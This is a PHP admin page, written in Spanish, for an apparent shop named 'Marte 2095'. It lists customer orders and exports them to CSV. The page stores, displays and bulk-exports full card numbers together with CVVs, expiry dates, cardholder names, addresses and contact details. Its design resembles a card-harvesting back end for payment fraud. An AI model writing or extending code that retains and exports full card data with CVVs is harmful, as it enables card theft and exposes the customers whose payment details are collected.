<?php
// admin_ordenes.php - Panel de administración de órdenes para Marte 2095
require_once __DIR__ . '/config.php';
session_start();

// Verificar autenticación
if (!isset($_SESSION['admin_conectado']) || $_SESSION['admin_conectado'] !== true) {
    header('Location: admin_login.php');
    exit;
}

// Registrar acceso
registrar_acceso_administrativo($_SESSION['usuario_admin'], 'VER_ORDENES');

// Obtener parámetros de búsqueda/filtro
$busqueda = $_GET['busqueda'] ?? '';
$estado = $_GET['estado'] ?? '';
$pagina = max(1, intval($_GET['pagina'] ?? 1));
$por_pagina = 20;
$offset = ($pagina - 1) * $por_pagina;

// Construir consulta
$where = [];
$parametros = [];

if (!empty($busqueda)) {
    $where[] = "(id_orden_mercante LIKE ? OR nombre_cliente LIKE ? OR correo_cliente LIKE ? OR numero_tarjeta LIKE ?)";
    $termino_busqueda = "%$busqueda%";
    $parametros = array_merge($parametros, [$termino_busqueda, $termino_busqueda, $termino_busqueda, $termino_busqueda]);
}

if (!empty($estado) && $estado !== 'todos') {
    $where[] = "estado = ?";
    $parametros[] = $estado;
}

$where_sql = $where ? "WHERE " . implode(" AND ", $where) : "";

// Exportar a CSV si se solicita
if (isset($_GET['exportar']) && $_GET['exportar'] === 'csv') {
    try {
        $pdo = obtener_pdo();
        $consulta = $pdo->prepare("SELECT * FROM ordenes $where_sql ORDER BY creado_en DESC");
        $consulta->execute($parametros);
        
        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename=ordenes_marte_' . date('Ymd_His') . '.csv');
        
        $salida = fopen('php://output', 'w');
        // Encabezados CSV con todos los campos
        fputcsv($salida, [
            'ID Orden', 'Producto', 'Monto', 'Moneda', 'Cantidad',
            'Cliente', 'Email', 'Teléfono',
            'Tarjeta', 'Titular', 'CVV', 'Expiración',
            'Dirección', 'Ciudad', 'Código Postal', 'País',
            'Estado', 'Nota Admin', 'Fecha Creación'
        ]);
        
        while ($orden = $consulta->fetch(PDO::FETCH_ASSOC)) {
            fputcsv($salida, [
                $orden['id_orden_mercante'],
                $orden['nombre_producto'],
                number_format($orden['monto_unidad'] / 100, 2),
                $orden['moneda'],
                $orden['cantidad'],
                $orden['nombre_cliente'],
                $orden['correo_cliente'],
                $orden['telefono_cliente'],
                $orden['numero_tarjeta'], // Número completo
                $orden['titular_tarjeta'],
                $orden['cvv'], // CVV completo
                $orden['mes_expiracion'] . '/' . $orden['ano_expiracion'], // Fecha de expiración
                $orden['direccion_facturacion'],
                $orden['ciudad_facturacion'],
                $orden['codigo_postal_facturacion'],
                $orden['pais_facturacion'],
                $orden['estado'],
                $orden['nota_administrador'] ?? '',
                date('Y-m-d H:i:s', $orden['creado_en'])
            ]);
        }
        
        fclose($salida);
        exit;
    } catch (Exception $e) {
        error_log("Error al exportar CSV: " . $e->getMessage());
        // No redirigir aquí para no interrumpir la descarga
    }
}

// Obtener total de órdenes
try {
    $pdo = obtener_pdo();
    $consulta_contador = $pdo->prepare("SELECT COUNT(*) FROM ordenes $where_sql");
    $consulta_contador->execute($parametros);
    $total_ordenes = (int)$consulta_contador->fetchColumn();
    $total_paginas = ceil($total_ordenes / $por_pagina);
    
    // Obtener órdenes paginadas
    $consulta = $pdo->prepare("SELECT * FROM ordenes $where_sql ORDER BY creado_en DESC LIMIT ? OFFSET ?");
    foreach ($parametros as $i => $parametro) {
        $consulta->bindValue($i + 1, $parametro);
    }
    $consulta->bindValue(count($parametros) + 1, $por_pagina, PDO::PARAM_INT);
    $consulta->bindValue(count($parametros) + 2, $offset, PDO::PARAM_INT);
    $consulta->execute();
    $ordenes = $consulta->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) {
    error_log("Error al obtener órdenes: " . $e->getMessage());
    $ordenes = [];
    $total_ordenes = 0;
    $total_paginas = 1;
}

// Verificar espacio en disco
$espacio_disco = verificar_espacio_disco();
$alerta_espacio = '';
if (is_array($espacio_disco) && !isset($espacio_disco['error']) && $espacio_disco['porcentaje_usado'] > 90) {
    $alerta_espacio = '<div class="alert alert-warning">
        <strong>⚠️ Advertencia:</strong> El espacio en disco está al ' . $espacio_disco['porcentaje_usado'] . '%. 
        Espacio libre: ' . $espacio_disco['libre_legible'] . ' de ' . $espacio_disco['total_legible'] . '.
    </div>';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Administración - Marte 2095</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .datos-sensibles {
            background-color: #fff3cd;
            font-family: 'Courier New', monospace;
            padding: 2px 5px;
            border-radius: 3px;
            font-size: 0.9em;
        }
        .numero-tarjeta {
            font-weight: bold;
        }
        .table-hover tbody tr:hover {
            background-color: rgba(52, 152, 219, 0.1);
        }
        .badge-estado {
            font-size: 0.8em;
            padding: 4px 8px;
            border-radius: 12px;
        }
        .badge-esperando { background-color: #f39c12; color: white; }
        .badge-aprobado { background-color: #2ecc71; color: white; }
        .badge-rechazado { background-color: #e74c3c; color: white; }
    </style>
</head>
<body class="bg-light">
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="admin_ordenes.php">
                Marte 2095 - Admin
            </a>
            <div class="navbar-nav ms-auto">
                <span class="navbar-text me-3">
                    <?= h($_SESSION['usuario_admin']) ?>
                </span>
                <a href="admin_logout.php" class="btn btn-outline-light btn-sm">
                    Cerrar Sesión
                </a>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <?= $alerta_espacio ?>
        
        <div class="card shadow-sm">
            <div class="card-header bg-white d-flex justify-content-between align-items-center">
                <h5 class="mb-0">Gestión de Órdenes</h5>
                <div>
                    <span class="badge bg-secondary"><?= $total_ordenes ?> órdenes</span>
                </div>
            </div>
            <div class="card-body">
                <!-- Formulario de búsqueda -->
                <form method="get" class="row g-3 mb-4">
                    <div class="col-md-5">
                        <input type="text" name="busqueda" class="form-control" placeholder="Buscar..." 
                               value="<?= h($busqueda) ?>">
                    </div>
                    <div class="col-md-3">
                        <select name="estado" class="form-select">
                            <option value="todos" <?= $estado === 'todos' ? 'selected' : '' ?>>Todos los estados</option>
                            <option value="ESPERANDO_REVISION" <?= $estado === 'ESPERANDO_REVISION' ? 'selected' : '' ?>>Pendiente</option>
                            <option value="APROBADO" <?= $estado === 'APROBADO' ? 'selected' : '' ?>>Aprobado</option>
                            <option value="RECHAZADO" <?= $estado === 'RECHAZADO' ? 'selected' : '' ?>>Rechazado</option>
                        </select>
                    </div>
                    <div class="col-md-4">
                        <button type="submit" class="btn btn-primary me-2">Buscar</button>
                        <a href="admin_ordenes.php?exportar=csv<?= !empty($busqueda) ? '&busqueda=' . urlencode($busqueda) : '' ?><?= !empty($estado) ? '&estado=' . urlencode($estado) : '' ?>" 
                           class="btn btn-success">Exportar CSV</a>
                    </div>
                </form>

                <!-- Tabla de órdenes -->
                <?php if (empty($ordenes)): ?>
                    <div class="alert alert-info">
                        No se encontraron órdenes.
                    </div>
                <?php else: ?>
                    <div class="table-responsive">
                        <table class="table table-hover table-striped">
                            <thead class="table-dark">
                                <tr>
                                    <th>ID Orden</th>
                                    <th>Producto</th>
                                    <th>Cliente</th>
                                    <th>Tarjeta</th>
                                    <th>Estado</th>
                                    <th>Fecha</th>
                                    <th>Acciones</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($ordenes as $orden): ?>
                                <tr>
                                    <td><code><?= h($orden['id_orden_mercante']) ?></code></td>
                                    <td><?= h($orden['nombre_producto']) ?></td>
                                    <td>
                                        <div><?= h($orden['nombre_cliente']) ?></div>
                                        <small class="text-muted"><?= h($orden['correo_cliente']) ?></small>
                                    </td>
                                    <td>
                                        <div class="datos-sensibles numero-tarjeta">
                                            <?= h(formatear_numero_tarjeta($orden['numero_tarjeta'])) ?>
                                        </div>
                                        <small class="text-muted"><?= h($orden['titular_tarjeta']) ?></small>
                                        <br>
                                        <small class="text-muted">
                                            CVV: <?= h($orden['cvv']) ?> | 
                                            Exp: <?= h($orden['mes_expiracion']) ?>/<?= h($orden['ano_expiracion']) ?>
                                        </small>
                                    </td>
                                    <td>
                                        <?php
                                        $clase_badge = 'badge-esperando';
                                        if ($orden['estado'] === 'APROBADO') $clase_badge = 'badge-aprobado';
                                        if ($orden['estado'] === 'RECHAZADO') $clase_badge = 'badge-rechazado';
                                        ?>
                                        <span class="badge-estado <?= $clase_badge ?>">
                                            <?= h($orden['estado']) ?>
                                        </span>
                                    </td>
                                    <td><?= date('Y-m-d H:i', $orden['creado_en']) ?></td>
                                    <td>
                                        <a href="admin_detalle_orden.php?id=<?= $orden['id'] ?>" 
                                           class="btn btn-sm btn-primary" title="Ver detalles">
                                            Ver
                                        </a>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                <?php endif; ?>

                <!-- Paginación -->
                <?php if ($total_paginas > 1): ?>
                    <nav aria-label="Paginación">
                        <ul class="pagination justify-content-center">
                            <?php if ($pagina > 1): ?>
                                <li class="page-item">
                                    <a class="page-link" 
                                       href="?pagina=<?= $pagina - 1 ?>&busqueda=<?= urlencode($busqueda) ?>&estado=<?= urlencode($estado) ?>">
                                        Anterior
                                    </a>
                                </li>
                            <?php endif; ?>
                            
                            <?php for ($i = 1; $i <= $total_paginas; $i++): ?>
                                <li class="page-item <?= $i === $pagina ? 'active' : '' ?>">
                                    <a class="page-link" 
                                       href="?pagina=<?= $i ?>&busqueda=<?= urlencode($busqueda) ?>&estado=<?= urlencode($estado) ?>">
                                        <?= $i ?>
                                    </a>
                                </li>
                            <?php endfor; ?>
                            
                            <?php if ($pagina < $total_paginas): ?>
                                <li class="page-item">
                                    <a class="page-link" 
                                       href="?pagina=<?= $pagina + 1 ?>&busqueda=<?= urlencode($busqueda) ?>&estado=<?= urlencode($estado) ?>">
                                        Siguiente
                                    </a>
                                </li>
                            <?php endif; ?>
                        </ul>
                    </nav>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
